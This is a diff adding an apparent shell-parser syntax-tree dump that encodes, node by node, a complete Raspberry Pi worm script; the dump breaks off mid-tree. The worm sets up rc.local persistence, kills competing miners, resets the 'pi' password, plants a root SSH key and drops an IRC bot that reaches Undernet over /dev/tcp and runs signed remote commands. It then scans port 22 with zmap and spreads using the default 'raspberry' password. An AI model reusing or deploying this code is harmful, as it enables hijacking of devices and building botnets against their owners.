@@ -1,0 +1,569 @@
+CommandNode(lineno=3, pos=(13, 33), parts=[
+  AssignmentNode(lineno=3, pos=(13, 33), word='MYSELF=`realpath $0`', parts=[
+    CommandsubstitutionNode(command=
+      CommandNode(lineno=3, pos=(21, 32), parts=[
+        WordNode(lineno=3, pos=(21, 29), word='realpath'),
+        WordNode(lineno=3, pos=(30, 32), word='$0', parts=[
+          ParameterNode(lineno=3, pos=(30, 32), value='0'),
+        ]),
+      ]), lineno=3, pos=(20, 33)),
+  ]),
+])
+CommandNode(lineno=4, pos=(34, 49), parts=[
+  AssignmentNode(lineno=4, pos=(34, 49), word='DEBUG=/dev/null'),
+])
+CommandNode(lineno=5, pos=(50, 72), parts=[
+  WordNode(lineno=5, pos=(50, 54), word='echo'),
+  WordNode(lineno=5, pos=(55, 62), word='$MYSELF', parts=[
+    ParameterNode(lineno=5, pos=(55, 62), value='MYSELF'),
+  ]),
+  RedirectNode(lineno=5, output=
+    WordNode(lineno=5, pos=(66, 72), word='$DEBUG', parts=[
+      ParameterNode(lineno=5, pos=(66, 72), value='DEBUG'),
+    ]), pos=(63, 72), type='>>'),
+])
+CompoundNode(lineno=86, list=[
+  IfNode(lineno=86, pos=(74, 4742), parts=[
+    ReservedwordNode(lineno=7, pos=(74, 76), word='if'),
+    CommandNode(lineno=7, pos=(77, 94), parts=[
+      WordNode(lineno=7, pos=(77, 78), word='['),
+      WordNode(lineno=7, pos=(79, 86), word='$EUID', parts=[
+        ParameterNode(lineno=7, pos=(80, 85), value='EUID'),
+      ]),
+      WordNode(lineno=7, pos=(87, 90), word='-ne'),
+      WordNode(lineno=7, pos=(91, 92), word='0'),
+      WordNode(lineno=7, pos=(93, 94), word=']'),
+    ]),
+    ReservedwordNode(lineno=8, pos=(95, 99), word='then'),
+    ListNode(lineno=16, pos=(102, 337), parts=[
+        CommandNode(lineno=9, pos=(102, 134), parts=[
+          AssignmentNode(discard=True, lineno=9, pos=(102, 134), word="NEWMYSELF=`mktemp -u 'XXXXXXXX'`", parts=[
+            CommandsubstitutionNode(command=
+              CommandNode(lineno=9, pos=(113, 133), parts=[
+                WordNode(lineno=9, pos=(113, 119), word='mktemp'),
+                WordNode(lineno=9, pos=(120, 122), word='-u'),
+                WordNode(lineno=9, pos=(123, 133), word='XXXXXXXX'),
+              ]), lineno=9, pos=(112, 134)),
+          ]),
+        ]),
+        OperatorNode(lineno=10, op='\n', pos=(134, 135)),
+        CommandNode(lineno=10, pos=(136, 167), parts=[
+          WordNode(discard=True, lineno=10, pos=(136, 140), word='sudo'),
+          WordNode(discard=True, lineno=10, pos=(141, 143), word='cp'),
+          WordNode(discard=True, lineno=10, pos=(144, 151), word='$MYSELF', parts=[
+            ParameterNode(lineno=10, pos=(144, 151), value='MYSELF'),
+          ]),
+          WordNode(discard=True, lineno=10, pos=(152, 167), word='/opt/$NEWMYSELF', parts=[
+            ParameterNode(lineno=10, pos=(157, 167), value='NEWMYSELF'),
+          ]),
+        ]),
+        OperatorNode(lineno=11, op='\n', pos=(167, 168)),
+        CommandNode(lineno=11, pos=(169, 217), parts=[
+          WordNode(discard=True, lineno=11, pos=(169, 173), word='sudo'),
+          WordNode(discard=True, lineno=11, pos=(174, 176), word='sh'),
+          WordNode(discard=True, lineno=11, pos=(177, 179), word='-c'),
+          WordNode(discard=True, lineno=11, pos=(180, 217), word="echo '#!/bin/sh -e' > /etc/rc.local"),
+        ]),
+        OperatorNode(lineno=12, op='\n', pos=(217, 218)),
+        CommandNode(lineno=12, pos=(219, 269), parts=[
+          WordNode(discard=True, lineno=12, pos=(219, 223), word='sudo'),
+          WordNode(discard=True, lineno=12, pos=(224, 226), word='sh'),
+          WordNode(discard=True, lineno=12, pos=(227, 229), word='-c'),
+          WordNode(discard=True, lineno=12, pos=(230, 269), word='echo /opt/$NEWMYSELF >> /etc/rc.local', parts=[
+            ParameterNode(lineno=12, pos=(241, 251), value='NEWMYSELF'),
+          ]),
+        ]),
+        OperatorNode(lineno=13, op='\n', pos=(269, 270)),
+        CommandNode(lineno=13, pos=(271, 314), parts=[
+          WordNode(discard=True, lineno=13, pos=(271, 275), word='sudo'),
+          WordNode(discard=True, lineno=13, pos=(276, 278), word='sh'),
+          WordNode(discard=True, lineno=13, pos=(279, 281), word='-c'),
+          WordNode(discard=True, lineno=13, pos=(282, 314), word="echo 'exit 0' >> /etc/rc.local"),
+        ]),
+        OperatorNode(lineno=14, op='\n', pos=(314, 315)),
+        CommandNode(lineno=14, pos=(316, 323), parts=[
+          WordNode(discard=True, lineno=14, pos=(316, 321), word='sleep'),
+          WordNode(discard=True, lineno=14, pos=(322, 323), word='1'),
+        ]),
+        OperatorNode(lineno=15, op='\n', pos=(323, 324)),
+        CommandNode(lineno=15, pos=(325, 336), parts=[
+          WordNode(discard=True, lineno=15, pos=(325, 329), word='sudo'),
+          WordNode(discard=True, lineno=15, pos=(330, 336), word='reboot'),
+        ]),
+        OperatorNode(lineno=16, op='\n', pos=(336, 337)),
+      ]),
+    ReservedwordNode(lineno=16, pos=(337, 341), word='else'),
+    ListNode(lineno=85, pos=(342, 4739), parts=[
+        CommandNode(lineno=17, pos=(342, 355), parts=[
+          WordNode(discard=True, lineno=17, pos=(342, 355), word='TMP1=`mktemp`', parts=[
+            CommandsubstitutionNode(command=
+              CommandNode(lineno=17, pos=(348, 354), parts=[
+                WordNode(lineno=17, pos=(348, 354), word='mktemp'),
+              ]), lineno=17, pos=(347, 355)),
+          ]),
+        ]),
+        OperatorNode(lineno=18, op='\n', pos=(355, 356)),
+        CommandNode(lineno=18, pos=(356, 376), parts=[
+          WordNode(discard=True, lineno=18, pos=(356, 360), word='echo'),
+          WordNode(discard=True, lineno=18, pos=(361, 366), word='$TMP1', parts=[
+            ParameterNode(lineno=18, pos=(361, 366), value='TMP1'),
+          ]),
+          RedirectNode(lineno=18, output=
+            WordNode(discard=True, lineno=18, pos=(370, 376), word='$DEBUG', parts=[
+              ParameterNode(lineno=18, pos=(370, 376), value='DEBUG'),
+            ]), pos=(367, 376), type='>>'),
+        ]),
+        OperatorNode(lineno=19, op='\n', pos=(376, 377)),
+        CommandNode(lineno=20, pos=(378, 393), parts=[
+          WordNode(discard=True, lineno=20, pos=(378, 385), word='killall'),
+          WordNode(discard=True, lineno=20, pos=(386, 393), word='bins.sh'),
+        ]),
+        OperatorNode(lineno=21, op='\n', pos=(393, 394)),
+        CommandNode(lineno=21, pos=(394, 408), parts=[
+          WordNode(discard=True, lineno=21, pos=(394, 401), word='killall'),
+          WordNode(discard=True, lineno=21, pos=(402, 408), word='minerd'),
+        ]),
+        OperatorNode(lineno=22, op='\n', pos=(408, 409)),
+        CommandNode(lineno=22, pos=(409, 421), parts=[
+          WordNode(discard=True, lineno=22, pos=(409, 416), word='killall'),
+          WordNode(discard=True, lineno=22, pos=(417, 421), word='node'),
+        ]),
+        OperatorNode(lineno=23, op='\n', pos=(421, 422)),
+        CommandNode(lineno=23, pos=(422, 436), parts=[
+          WordNode(discard=True, lineno=23, pos=(422, 429), word='killall'),
+          WordNode(discard=True, lineno=23, pos=(430, 436), word='nodejs'),
+        ]),
+        OperatorNode(lineno=24, op='\n', pos=(436, 437)),
+        CommandNode(lineno=24, pos=(437, 455), parts=[
+          WordNode(discard=True, lineno=24, pos=(437, 444), word='killall'),
+          WordNode(discard=True, lineno=24, pos=(445, 455), word='ktx-armv4l'),
+        ]),
+        OperatorNode(lineno=25, op='\n', pos=(455, 456)),
+        CommandNode(lineno=25, pos=(456, 472), parts=[
+          WordNode(discard=True, lineno=25, pos=(456, 463), word='killall'),
+          WordNode(discard=True, lineno=25, pos=(464, 472), word='ktx-i586'),
+        ]),
+        OperatorNode(lineno=26, op='\n', pos=(472, 473)),
+        CommandNode(lineno=26, pos=(473, 489), parts=[
+          WordNode(discard=True, lineno=26, pos=(473, 480), word='killall'),
+          WordNode(discard=True, lineno=26, pos=(481, 489), word='ktx-m68k'),
+        ]),
+        OperatorNode(lineno=27, op='\n', pos=(489, 490)),
+        CommandNode(lineno=27, pos=(490, 506), parts=[
+          WordNode(discard=True, lineno=27, pos=(490, 497), word='killall'),
+          WordNode(discard=True, lineno=27, pos=(498, 506), word='ktx-mips'),
+        ]),
+        OperatorNode(lineno=28, op='\n', pos=(506, 507)),
+        CommandNode(lineno=28, pos=(507, 525), parts=[
+          WordNode(discard=True, lineno=28, pos=(507, 514), word='killall'),
+          WordNode(discard=True, lineno=28, pos=(515, 525), word='ktx-mipsel'),
+        ]),
+        OperatorNode(lineno=29, op='\n', pos=(525, 526)),
+        CommandNode(lineno=29, pos=(526, 545), parts=[
+          WordNode(discard=True, lineno=29, pos=(526, 533), word='killall'),
+          WordNode(discard=True, lineno=29, pos=(534, 545), word='ktx-powerpc'),
+        ]),
+        OperatorNode(lineno=30, op='\n', pos=(545, 546)),
+        CommandNode(lineno=30, pos=(546, 561), parts=[
+          WordNode(discard=True, lineno=30, pos=(546, 553), word='killall'),
+          WordNode(discard=True, lineno=30, pos=(554, 561), word='ktx-sh4'),
+        ]),
+        OperatorNode(lineno=31, op='\n', pos=(561, 562)),
+        CommandNode(lineno=31, pos=(562, 579), parts=[
+          WordNode(discard=True, lineno=31, pos=(562, 569), word='killall'),
+          WordNode(discard=True, lineno=31, pos=(570, 579), word='ktx-sparc'),
+        ]),
+        OperatorNode(lineno=32, op='\n', pos=(579, 580)),
+        CommandNode(lineno=32, pos=(580, 592), parts=[
+          WordNode(discard=True, lineno=32, pos=(580, 587), word='killall'),
+          WordNode(discard=True, lineno=32, pos=(588, 592), word='arm5'),
+        ]),
+        OperatorNode(lineno=33, op='\n', pos=(592, 593)),
+        CommandNode(lineno=33, pos=(593, 605), parts=[
+          WordNode(discard=True, lineno=33, pos=(593, 600), word='killall'),
+          WordNode(discard=True, lineno=33, pos=(601, 605), word='zmap'),
+        ]),
+        OperatorNode(lineno=34, op='\n', pos=(605, 606)),
+        CommandNode(lineno=34, pos=(606, 620), parts=[
+          WordNode(discard=True, lineno=34, pos=(606, 613), word='killall'),
+          WordNode(discard=True, lineno=34, pos=(614, 620), word='kaiten'),
+        ]),
+        OperatorNode(lineno=35, op='\n', pos=(620, 621)),
+        CommandNode(lineno=35, pos=(621, 633), parts=[
+          WordNode(discard=True, lineno=35, pos=(621, 628), word='killall'),
+          WordNode(discard=True, lineno=35, pos=(629, 633), word='perl'),
+        ]),
+        OperatorNode(lineno=36, op='\n', pos=(633, 634)),
+        CommandNode(lineno=37, pos=(635, 693), parts=[
+          WordNode(discard=True, lineno=37, pos=(635, 639), word='echo'),
+          WordNode(discard=True, lineno=37, pos=(640, 679), word='127.0.0.1 bins.deutschland-zahlung.eu'),
+          RedirectNode(lineno=37, output=
+            WordNode(discard=True, lineno=37, pos=(683, 693), word='/etc/hosts'), pos=(680, 693), type='>>'),
+        ]),
+        OperatorNode(lineno=38, op='\n', pos=(693, 694)),
+        CommandNode(lineno=38, pos=(694, 714), parts=[
+          WordNode(discard=True, lineno=38, pos=(694, 696), word='rm'),
+          WordNode(discard=True, lineno=38, pos=(697, 700), word='-rf'),
+          WordNode(discard=True, lineno=38, pos=(701, 714), word='/root/.bashrc'),
+        ]),
+        OperatorNode(lineno=39, op='\n', pos=(714, 715)),
+        CommandNode(lineno=39, pos=(715, 738), parts=[
+          WordNode(discard=True, lineno=39, pos=(715, 717), word='rm'),
+          WordNode(discard=True, lineno=39, pos=(718, 721), word='-rf'),
+          WordNode(discard=True, lineno=39, pos=(722, 738), word='/home/pi/.bashrc'),
+        ]),
+        OperatorNode(lineno=40, op='\n', pos=(738, 739)),
+        CommandNode(lineno=41, pos=(740, 855), parts=[
+          WordNode(discard=True, lineno=41, pos=(740, 747), word='usermod'),
+          WordNode(discard=True, lineno=41, pos=(748, 750), word='-p'),
+          WordNode(discard=True, lineno=41, pos=(751, 852), word='$6$vGkGPKUr$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1'),
+          WordNode(discard=True, lineno=41, pos=(853, 855), word='pi'),
+        ]),
+        OperatorNode(lineno=42, op='\n', pos=(855, 856)),
+        CommandNode(lineno=43, pos=(857, 876), parts=[
+          WordNode(discard=True, lineno=43, pos=(857, 862), word='mkdir'),
+          WordNode(discard=True, lineno=43, pos=(863, 865), word='-p'),
+          WordNode(discard=True, lineno=43, pos=(866, 876), word='/root/.ssh'),
+        ]),
+        OperatorNode(lineno=44, op='\n', pos=(876, 877)),
+        CommandNode(lineno=44, pos=(877, 1295), parts=[
+          WordNode(discard=True, lineno=44, pos=(877, 881), word='echo'),
+          WordNode(discard=True, lineno=44, pos=(882, 1264), word='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B'),
+          RedirectNode(lineno=44, output=
+            WordNode(discard=True, lineno=44, pos=(1269, 1295), word='/root/.ssh/authorized_keys'), pos=(1266, 1295), type='>>'),
+        ]),
+        OperatorNode(lineno=45, op='\n', pos=(1295, 1296)),
+        CommandNode(lineno=46, pos=(1297, 1342), parts=[
+          WordNode(discard=True, lineno=46, pos=(1297, 1301), word='echo'),
+          WordNode(discard=True, lineno=46, pos=(1302, 1322), word='nameserver 8.8.8.8'),
+          RedirectNode(lineno=46, output=
+            WordNode(discard=True, lineno=46, pos=(1326, 1342), word='/etc/resolv.conf'), pos=(1323, 1342), type='>>'),
+        ]),
+        OperatorNode(lineno=47, op='\n', pos=(1342, 1343)),
+        CommandNode(lineno=47, pos=(1343, 1359), parts=[
+          WordNode(discard=True, lineno=47, pos=(1343, 1345), word='rm'),
+          WordNode(discard=True, lineno=47, pos=(1346, 1349), word='-rf'),
+          WordNode(discard=True, lineno=47, pos=(1350, 1359), word='/tmp/ktx*'),
+        ]),
+        OperatorNode(lineno=48, op='\n', pos=(1359, 1360)),
+        CommandNode(lineno=48, pos=(1360, 1386), parts=[
+          WordNode(discard=True, lineno=48, pos=(1360, 1362), word='rm'),
+          WordNode(discard=True, lineno=48, pos=(1363, 1366), word='-rf'),
+          WordNode(discard=True, lineno=48, pos=(1367, 1386), word='/tmp/cpuminer-multi'),
+        ]),
+        OperatorNode(lineno=49, op='\n', pos=(1386, 1387)),
+        CommandNode(lineno=49, pos=(1387, 1409), parts=[
+          WordNode(discard=True, lineno=49, pos=(1387, 1389), word='rm'),
+          WordNode(discard=True, lineno=49, pos=(1390, 1393), word='-rf'),
+          WordNode(discard=True, lineno=49, pos=(1394, 1409), word='/var/tmp/kaiten'),
+        ]),
+        OperatorNode(lineno=50, op='\n', pos=(1409, 1410)),
+        CommandNode(lineno=13, pos=(1411, 1444), parts=[
+          WordNode(discard=True, lineno=51, pos=(1411, 1414), word='cat'),
+          RedirectNode(lineno=51, output=
+            WordNode(discard=True, lineno=51, pos=(1417, 1432), word='/tmp/public.pem'), pos=(1415, 1432), type='>'),
+          RedirectNode(heredoc=
+            HeredocNode(lineno=12, pos=(1472, 1726), value='MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER'), lineno=51, output=
+            WordNode(discard=True, lineno=51, pos=(1435, 1444), word='EOFMARKER'), pos=(1433, 1444), type='<<'),
+        ]),
+        OperatorNode(lineno=52, op='\n', pos=(1444, 1445)),
+        CommandNode(lineno=52, pos=(1445, 1471), parts=[
+          WordNode(discard=True, lineno=52, pos=(1445, 1455), word='-----BEGIN'),
+          WordNode(discard=True, lineno=52, pos=(1456, 1462), word='PUBLIC'),
+          WordNode(discard=True, lineno=52, pos=(1463, 1471), word='KEY-----'),
+        ]),
+        OperatorNode(lineno=53, op='\n', pos=(1471, 1727)),
+        CommandNode(lineno=54, pos=(1728, 1754), parts=[
+          AssignmentNode(discard=True, lineno=54, pos=(1728, 1754), word="BOT=`mktemp -u 'XXXXXXXX'`", parts=[
+            CommandsubstitutionNode(command=
+              CommandNode(lineno=54, pos=(1733, 1753), parts=[
+                WordNode(lineno=54, pos=(1733, 1739), word='mktemp'),
+                WordNode(lineno=54, pos=(1740, 1742), word='-u'),
+                WordNode(lineno=54, pos=(1743, 1753), word='XXXXXXXX'),
+              ]), lineno=54, pos=(1732, 1754)),
+          ]),
+        ]),
+        OperatorNode(lineno=55, op='\n', pos=(1754, 1755)),
+        CommandNode(lineno=76, pos=(1756, 1785), parts=[
+          WordNode(discard=True, lineno=56, pos=(1756, 1759), word='cat'),
+          RedirectNode(lineno=56, output=
+            WordNode(discard=True, lineno=56, pos=(1762, 1771), word='/tmp/$BOT', parts=[
+              ParameterNode(lineno=56, pos=(1767, 1771), value='BOT'),
+            ]), pos=(1760, 1771), type='>'),
+          RedirectNode(heredoc=
+            HeredocNode(lineno=75, pos=(1798, 3419), value='\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER'), lineno=56, output=
+            WordNode(discard=True, lineno=56, pos=(1774, 1785), word="'EOFMARKER'"), pos=(1772, 1785), type='<<'),
+        ]),
+        OperatorNode(lineno=57, op='\n', pos=(1785, 1786)),
+        CommandNode(lineno=59, pos=(3421, 3439), parts=[
+          WordNode(discard=True, lineno=59, pos=(3421, 3426), word='chmod'),
+          WordNode(discard=True, lineno=59, pos=(3427, 3429), word='+x'),
+          WordNode(discard=True, lineno=59, pos=(3430, 3439), word='/tmp/$BOT', parts=[
+            ParameterNode(lineno=59, pos=(3435, 3439), value='BOT'),
+          ]),
+        ]),
+        OperatorNode(lineno=60, op='\n', pos=(3439, 3440)),
+        CommandNode(lineno=60, pos=(3440, 3475), parts=[
+          WordNode(discard=True, lineno=60, pos=(3440, 3445), word='nohup'),
+          WordNode(discard=True, lineno=60, pos=(3446, 3455), word='/tmp/$BOT', parts=[
+            ParameterNode(lineno=60, pos=(3451, 3455), value='BOT'),
+          ]),
+          RedirectNode(input=2, lineno=60, output=1, pos=(3456, 3460), type='>&'),
+          RedirectNode(lineno=60, output=
+            WordNode(discard=True, lineno=60, pos=(3463, 3475), word='/tmp/bot.log'), pos=(3461, 3475), type='>'),
+        ]),
+        OperatorNode(lineno=60, op='&', pos=(3476, 3477)),
+        CommandNode(lineno=61, pos=(3478, 3499), parts=[
+          WordNode(discard=True, lineno=61, pos=(3478, 3480), word='rm'),
+          WordNode(discard=True, lineno=61, pos=(3481, 3495), word='/tmp/nohup.log'),
+          WordNode(discard=True, lineno=61, pos=(3496, 3499), word='-rf'),
+        ]),
+        OperatorNode(lineno=62, op='\n', pos=(3499, 3500)),
+        CommandNode(lineno=62, pos=(3500, 3516), parts=[
+          WordNode(discard=True, lineno=62, pos=(3500, 3502), word='rm'),
+          WordNode(discard=True, lineno=62, pos=(3503, 3506), word='-rf'),
+          WordNode(discard=True, lineno=62, pos=(3507, 3516), word='nohup.out'),
+        ]),
+        OperatorNode(lineno=63, op='\n', pos=(3516, 3517)),
+        CommandNode(lineno=63, pos=(3517, 3524), parts=[
+          WordNode(discard=True, lineno=63, pos=(3517, 3522), word='sleep'),
+          WordNode(discard=True, lineno=63, pos=(3523, 3524), word='3'),
+        ]),
+        OperatorNode(lineno=64, op='\n', pos=(3524, 3525)),
+        CommandNode(lineno=64, pos=(3525, 3541), parts=[
+          WordNode(discard=True, lineno=64, pos=(3525, 3527), word='rm'),
+          WordNode(discard=True, lineno=64, pos=(3528, 3531), word='-rf'),
+          WordNode(discard=True, lineno=64, pos=(3532, 3541), word='/tmp/$BOT', parts=[
+            ParameterNode(lineno=64, pos=(3537, 3541), value='BOT'),
+          ]),
+        ]),
+        OperatorNode(lineno=65, op='\n', pos=(3541, 3542)),
+        CommandNode(lineno=66, pos=(3543, 3570), parts=[
+          AssignmentNode(discard=True, lineno=66, pos=(3543, 3570), word="NAME=`mktemp -u 'XXXXXXXX'`", parts=[
+            CommandsubstitutionNode(command=
+              CommandNode(lineno=66, pos=(3549, 3569), parts=[
+                WordNode(lineno=66, pos=(3549, 3555), word='mktemp'),
+                WordNode(lineno=66, pos=(3556, 3558), word='-u'),
+                WordNode(lineno=66, pos=(3559, 3569), word='XXXXXXXX'),
+              ]), lineno=66, pos=(3548, 3570)),
+          ]),
+        ]),
+        OperatorNode(lineno=67, op='\n', pos=(3570, 3571)),
+        CommandNode(lineno=68, pos=(3572, 3586), parts=[
+          WordNode(discard=True, lineno=68, pos=(3572, 3576), word='date'),
+          RedirectNode(lineno=68, output=
+            WordNode(discard=True, lineno=68, pos=(3579, 3586), word='/tmp/.s'), pos=(3577, 3586), type='>'),
+        ]),
+        OperatorNode(lineno=69, op='\n', pos=(3586, 3587)),
+        CommandNode(lineno=70, pos=(3588, 3617), parts=[
+          WordNode(discard=True, lineno=70, pos=(3588, 3595), word='apt-get'),
+          WordNode(discard=True, lineno=70, pos=(3596, 3602), word='update'),
+          WordNode(discard=True, lineno=70, pos=(3603, 3605), word='-y'),
+          WordNode(discard=True, lineno=70, pos=(3606, 3617), word='--force-yes'),
+        ]),
+        OperatorNode(lineno=71, op='\n', pos=(3617, 3618)),
+        CommandNode(lineno=71, pos=(3618, 3661), parts=[
+          WordNode(discard=True, lineno=71, pos=(3618, 3625), word='apt-get'),
+          WordNode(discard=True, lineno=71, pos=(3626, 3633), word='install'),
+          WordNode(discard=True, lineno=71, pos=(3634, 3638), word='zmap'),
+          WordNode(discard=True, lineno=71, pos=(3639, 3646), word='sshpass'),
+          WordNode(discard=True, lineno=71, pos=(3647, 3649), word='-y'),
+          WordNode(discard=True, lineno=71, pos=(3650, 3661), word='--force-yes'),
+        ]),
+        OperatorNode(lineno=72, op='\n', pos=(3661, 3662)),
+        CompoundNode(lineno=84, list=[
+          WhileNode(lineno=84, pos=(3663, 4738), parts=[
+            ReservedwordNode(lineno=73, pos=(3663, 3668), word='while'),
+            ListNode(lineno=73, pos=(3669, 3678), parts=[
+                CommandNode(lineno=73, pos=(3669, 3677), parts=[
+                  WordNode(discard=True, lineno=73, pos=(3669, 3670), word='['),
+                  WordNode(discard=True, lineno=73, pos=(3671, 3675), word='true'),
+                  WordNode(discard=True, lineno=73, pos=(3676, 3677), word=']'),
+                ]),
+                OperatorNode(lineno=73, op=';', pos=(3677, 3678)),
+              ]),
+            ReservedwordNode(lineno=73, pos=(3679, 3681), word='do'),
+            ListNode(lineno=84, pos=(3683, 4734), parts=[
+                CommandNode(lineno=74, pos=(3683, 3696), parts=[
+                  AssignmentNode(discard=True, lineno=74, pos=(3683, 3696), word='FILE=`mktemp`', parts=[
+                    CommandsubstitutionNode(command=
+                      CommandNode(lineno=74, pos=(3689, 3695), parts=[
+                        WordNode(lineno=74, pos=(3689, 3695), word='mktemp'),
+                      ]), lineno=74, pos=(3688, 3696)),
+                  ]),
+                ]),
+                OperatorNode(lineno=75, op='\n', pos=(3696, 3697)),
+                CommandNode(lineno=75, pos=(3698, 3727), parts=[
+                  WordNode(discard=True, lineno=75, pos=(3698, 3702), word='zmap'),
+                  WordNode(discard=True, lineno=75, pos=(3703, 3705), word='-p'),
+                  WordNode(discard=True, lineno=75, pos=(3706, 3708), word='22'),
+                  WordNode(discard=True, lineno=75, pos=(3709, 3711), word='-o'),
+                  WordNode(discard=True, lineno=75, pos=(3712, 3717), word='$FILE', parts=[
+                    ParameterNode(lineno=75, pos=(3712, 3717), value='FILE'),
+                  ]),
+                  WordNode(discard=True, lineno=75, pos=(3718, 3720), word='-n'),
+                  WordNode(discard=True, lineno=75, pos=(3721, 3727), word='100000'),
+                ]),
+                OperatorNode(lineno=76, op='\n', pos=(3727, 3728)),
+                CommandNode(lineno=76, pos=(3729, 3744), parts=[
+                  WordNode(discard=True, lineno=76, pos=(3729, 3736), word='killall'),
+                  WordNode(discard=True, lineno=76, pos=(3737, 3740), word='ssh'),
+                  WordNode(discard=True, lineno=76, pos=(3741, 3744), word='scp'),
+                ]),
+                OperatorNode(lineno=77, op='\n', pos=(3744, 3745)),
+                CompoundNode(lineno=81, list=[
+                  ForNode(lineno=81, pos=(3746, 4709), parts=[
+                    ReservedwordNode(lineno=77, pos=(3746, 3749), word='for'),
+                    WordNode(discard=True, lineno=77, pos=(3750, 3752), word='IP'),
+                    ReservedwordNode(lineno=77, pos=(3753, 3755), word='in'),
+                    WordNode(discard=True, lineno=77, pos=(3756, 3767), word='`cat $FILE`', parts=[
+                      CommandsubstitutionNode(command=
+                        CommandNode(lineno=77, pos=(3757, 3766), parts=[
+                          WordNode(lineno=77, pos=(3757, 3760), word='cat'),
+                          WordNode(lineno=77, pos=(3761, 3766), word='$FILE', parts=[
+                            ParameterNode(lineno=77, pos=(3761, 3766), value='FILE'),
+                          ]),
+                        ]), lineno=77, pos=(3756, 3767)),
+                    ]),
+                    ReservedwordNode(lineno=78, pos=(3769, 3771), word='do'),
+                    ListNode(lineno=80, pos=(3774, 4703), parts=[
+                        CommandNode(lineno=79, pos=(3774, 3969), parts=[
+                          WordNode(discard=True, lineno=79, pos=(3774, 3781), word='sshpass'),
+                          WordNode(discard=True, lineno=79, pos=(3782, 3793), word='-praspberry'),
+                          WordNode(discard=True, lineno=79, pos=(3794, 3797), word='scp'),
+                          WordNode(discard=True, lineno=79, pos=(3798, 3800), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(3801, 3817), word='ConnectTimeout=6'),
+                          WordNode(discard=True, lineno=79, pos=(3818, 3820), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(3821, 3846), word='NumberOfPasswordPrompts=1'),
+                          WordNode(discard=True, lineno=79, pos=(3847, 3849), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(3850, 3883), word='PreferredAuthentications=password'),
+                          WordNode(discard=True, lineno=79, pos=(3884, 3886), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(3887, 3915), word='UserKnownHostsFile=/dev/null'),
+                          WordNode(discard=True, lineno=79, pos=(3916, 3918), word='-o'),
+                          WordNode(discard=True, lineno=79, pos=(3919, 3943), word='StrictHostKeyChecking=no'),
+                          WordNode(discard=True, lineno=79, pos=(3944, 3951), word='$MYSELF', parts=[
+                            ParameterNode(lineno=79, pos=(3944, 3951), value='MYSELF'),
+                          ]),
